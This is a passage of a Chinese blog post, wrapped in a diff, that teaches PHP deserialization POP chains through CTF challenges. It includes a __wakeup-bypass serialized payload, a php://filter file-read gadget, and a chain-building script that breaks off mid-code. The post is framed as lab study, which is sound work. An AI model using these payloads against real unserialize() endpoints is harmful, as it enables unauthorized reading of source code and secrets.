@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="rowen">
+
+
+
+
+
+<title>PHP 反序列化 POP 链学习：从 wakeup 绕过到伪协议读文件 | Hexo</title>
+
+
+
+    <link rel="icon" href="/drink.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+ <script type="text/javascript" src="/js/snow2.js"></script>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+<script>
+!
+function() {
+function n(n, e, t) {
+return n.getAttribute(e) || t
+}
+function e(n) {
+return document.getElementsByTagName(n)
+}
+function t() {
+var t = e("script"),
+o = t.length,
+i = t[o - 1];
+return {
+l: o,
+z: n(i, "zIndex", -1), //置于主页面背后
+o: n(i, "opacity", .5), //线条透明度
+c: n(i, "color", "0,0,0"), //线条颜色
+n: n(i, "count", 100) //线条数量
+}
+}
+function o() {
+a = m.width = window.innerWidth ||
+document.documentElement.clientWidth || document.body.clientWidth,
+c = m.height = window.innerHeight ||
+document.documentElement.clientHeight || document.body.clientHeight
+}
+function i() {
+r.clearRect(0, 0, a, c);
+var n, e, t, o, m, l;
+s.forEach(function(i, x) {
+for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 :
+1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1,
+1), e = x + 1; e < u.length; e++) n = u[e],
+null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l
+= o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o,
+i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t /
+2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y),
+r.lineTo(n.x, n.y), r.stroke()))
+}),
+x(i)
+}
+var a, c, u, m = document.createElement("canvas"),
+d = t(),
+l = "c_n" + d.l,
+r = m.getContext("2d"),
+x = window.requestAnimationFrame || window.webkitRequestAnimationFrame
+|| window.mozRequestAnimationFrame || window.oRequestAnimationFrame ||
+window.msRequestAnimationFrame ||
+function(n) {
+window.setTimeout(n, 1e3 / 45)
+},
+w = Math.random,
+y = {
+x: null,
+y: null,
+max: 2e4
+};
+m.id = l,
+m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z +
+";opacity:" + d.o,
+e("body")[0].appendChild(m),
+o(),
+window.onresize = o,
+window.onmousemove = function(n) {
+n = n || window.event,
+y.x = n.clientX,
+y.y = n.clientY
+},
+window.onmouseout = function() {
+y.x = null,
+y.y = null
+};
+for (var s = [], f = 0; d.n > f; f++) {
+var h = w() * a,
+g = w() * c,
+v = 2 * w() - 1,
+p = 2 * w() - 1;
+s.push({
+x: h,
+y: g,
+xa: v,
+ya: p,
+max: 6e3
+})
+}
+u = s.concat([y]),
+setTimeout(function() {
+i()
+},
+100)
+} ();
+</script>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">bobo&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">bobo&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">PHP 反序列化 POP 链学习：从 wakeup 绕过到伪协议读文件</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">rowen</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 20, 2026&nbsp;&nbsp;23:20:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="PHP-反序列化-POP-链学习：从-wakeup-绕过到伪协议读文件"><a href="#PHP-反序列化-POP-链学习：从-wakeup-绕过到伪协议读文件" class="headerlink" title="PHP 反序列化 POP 链学习：从 wakeup 绕过到伪协议读文件"></a>PHP 反序列化 POP 链学习：从 wakeup 绕过到伪协议读文件</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>PHP 反序列化是 Web CTF 中非常常见的考点，也是真实代码审计中需要重点关注的风险点。它的核心不是“背 payload”，而是理解对象在反序列化后的生命周期，以及魔术方法之间如何形成调用链。</p>
+<p>本文结合几道典型题目，总结 PHP 反序列化中常见的三个方向：</p>
+<ul>
+<li><code>__wakeup()</code> 绕过</li>
+<li>private&#x2F;protected 属性序列化格式</li>
+<li>POP 链构造和伪协议读文件</li>
+</ul>
+<p>内容仅用于靶场学习和授权环境复现。</p>
+<h2 id="二、PHP-序列化基础"><a href="#二、PHP-序列化基础" class="headerlink" title="二、PHP 序列化基础"></a>二、PHP 序列化基础</h2><p>一个普通对象序列化后大概长这样：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;role&quot;;s:4:&quot;root&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>含义如下：</p>
+<table>
+<thead>
+<tr>
+<th>片段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>O</code></td>
+<td>object，对象</td>
+</tr>
+<tr>
+<td><code>4</code></td>
+<td>类名长度</td>
+</tr>
+<tr>
+<td><code>&quot;User&quot;</code></td>
+<td>类名</td>
+</tr>
+<tr>
+<td><code>2</code></td>
+<td>属性数量</td>
+</tr>
+<tr>
+<td><code>s:4:&quot;name&quot;</code></td>
+<td>字符串类型属性名</td>
+</tr>
+<tr>
+<td><code>s:5:&quot;admin&quot;</code></td>
+<td>字符串类型属性值</td>
+</tr>
+</tbody></table>
+<p>常见类型标识：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s  string</span><br><span class="line">i  integer</span><br><span class="line">b  boolean</span><br><span class="line">a  array</span><br><span class="line">O  object</span><br><span class="line">N  null</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、属性可见性"><a href="#三、属性可见性" class="headerlink" title="三、属性可见性"></a>三、属性可见性</h2><p>PHP 中 public、protected、private 属性在序列化后的格式不同。</p>
+<h3 id="1-public"><a href="#1-public" class="headerlink" title="1. public"></a>1. public</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>序列化后：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:4:&quot;name&quot;;s:5:&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-protected"><a href="#2-protected" class="headerlink" title="2. protected"></a>2. protected</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>序列化后属性名前会带有：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\0*\0</span><br></pre></td></tr></table></figure>
+
+<p>URL 编码后表现为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00%2A%00name</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-private"><a href="#3-private" class="headerlink" title="3. private"></a>3. private</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>序列化后属性名前会带有：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\0类名\0</span><br></pre></td></tr></table></figure>
+
+<p>URL 编码后类似：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00User%00name</span><br></pre></td></tr></table></figure>
+
+<p>这也是很多题目中 payload 需要 URL 编码的原因。</p>
+<h2 id="四、魔术方法触发点"><a href="#四、魔术方法触发点" class="headerlink" title="四、魔术方法触发点"></a>四、魔术方法触发点</h2><p>PHP 反序列化题常见魔术方法：</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>触发场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>__wakeup()</code></td>
+<td><code>unserialize()</code> 时触发</td>
+</tr>
+<tr>
+<td><code>__destruct()</code></td>
+<td>对象销毁时触发</td>
+</tr>
+<tr>
+<td><code>__toString()</code></td>
+<td>对象被当作字符串使用时触发</td>
+</tr>
+<tr>
+<td><code>__get()</code></td>
+<td>读取不可访问属性时触发</td>
+</tr>
+<tr>
+<td><code>__set()</code></td>
+<td>写入不可访问属性时触发</td>
+</tr>
+<tr>
+<td><code>__call()</code></td>
+<td>调用不可访问方法时触发</td>
+</tr>
+<tr>
+<td><code>__invoke()</code></td>
+<td>对象被当作函数调用时触发</td>
+</tr>
+</tbody></table>
+<p>构造 POP 链时，一般要先找“链尾”，也就是最终能产生敏感行为的位置，例如：</p>
+<ul>
+<li><code>file_get_contents()</code></li>
+<li><code>include()</code></li>
+<li><code>system()</code></li>
+<li><code>eval()</code></li>
+<li><code>call_user_func()</code></li>
+</ul>
+<p>然后再从触发方法一步步往前推。</p>
+<h2 id="五、案例一：wakeup-绕过读取-flag"><a href="#五、案例一：wakeup-绕过读取-flag" class="headerlink" title="五、案例一：wakeup 绕过读取 flag"></a>五、案例一：wakeup 绕过读取 flag</h2><p>某题源码逻辑如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br></pre></td></tr></table></figure>
+
+<p>目标：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username === admin</span><br><span class="line">password == 100</span><br></pre></td></tr></table></figure>
+
+<p>但 <code>__wakeup()</code> 会把 <code>username</code> 改成 <code>guest</code>，所以需要绕过 <code>__wakeup()</code>。</p>
+<p>老版本 PHP 中存在一种常见绕过思路：当序列化字符串中声明的属性数量大于实际属性数量时，可能跳过 <code>__wakeup()</code>。</p>
+<p>构造重点：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;...&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实际只有两个属性，但数量写成 3。</p>
+<p>由于属性是 private，需要使用 <code>%00Name%00username</code> 和 <code>%00Name%00password</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个案例的重点：</p>
+<ul>
+<li>private 属性需要带类名前缀。</li>
+<li><code>__wakeup()</code> 会影响反序列化后的属性。</li>
+<li>属性数量异常可用于特定版本下绕过 <code>__wakeup()</code>。</li>
+</ul>
+<h2 id="六、案例二：AreUSerialz-强弱类型绕过"><a href="#六、案例二：AreUSerialz-强弱类型绕过" class="headerlink" title="六、案例二：AreUSerialz 强弱类型绕过"></a>六、案例二：AreUSerialz 强弱类型绕过</h2><p>题目核心代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>目标是进入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>从而调用 <code>read()</code> 读取文件。</p>
+<p>但是析构方法中有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里一个是弱类型比较：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>另一个是强类型比较：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>因此可以设置：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$op</span> = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这样：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2 === &quot;2&quot;  不成立</span><br><span class="line">2 == &quot;2&quot;   成立</span><br></pre></td></tr></table></figure>
+
+<p>最终绕过析构方法中的强类型判断，同时进入 <code>process()</code> 中的读文件分支。</p>
+<p>读取 <code>flag.php</code> 可使用 PHP 伪协议：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>构造示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这个案例的重点：</p>
+<ul>
+<li>找到最终敏感函数 <code>file_get_contents()</code>。</li>
+<li>利用 <code>php://filter</code> 读取源码。</li>
+<li>利用强弱类型比较差异绕过逻辑限制。</li>
+<li>在部分题目中可将 protected 属性改为 public 来绕过不可见字符限制。</li>
+</ul>
+<h2 id="七、案例三：典型-POP-链构造"><a href="#七、案例三：典型-POP-链构造" class="headerlink" title="七、案例三：典型 POP 链构造"></a>七、案例三：典型 POP 链构造</h2><p>某题中存在三个类：<code>Show</code>、<code>Test</code>、<code>Modifier</code>。关键触发点类似：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这类题通常不是一个方法直接读 flag，而是通过多个魔术方法串起来：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unserialize()</span><br><span class="line">-&gt; __wakeup()</span><br><span class="line">-&gt; 对象转字符串触发 __toString()</span><br><span class="line">-&gt; 读取不可访问属性触发 __get()</span><br><span class="line">-&gt; 对象当函数触发 __invoke()</span><br><span class="line">-&gt; include/file_get_contents 读取 flag</span><br></pre></td></tr></table></figure>
+
+<p>构造 POP 链的步骤：</p>
+<ol>
+<li>先找链尾，也就是最终的文件包含或文件读取。</li>
+<li>再找哪个魔术方法能触发链尾。</li>
+<li>继续往前找哪个属性或方法能触发这个魔术方法。</li>
+<li>最后把对象属性按链路连接起来。</li>
+</ol>
+<p>示例构造思路：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = 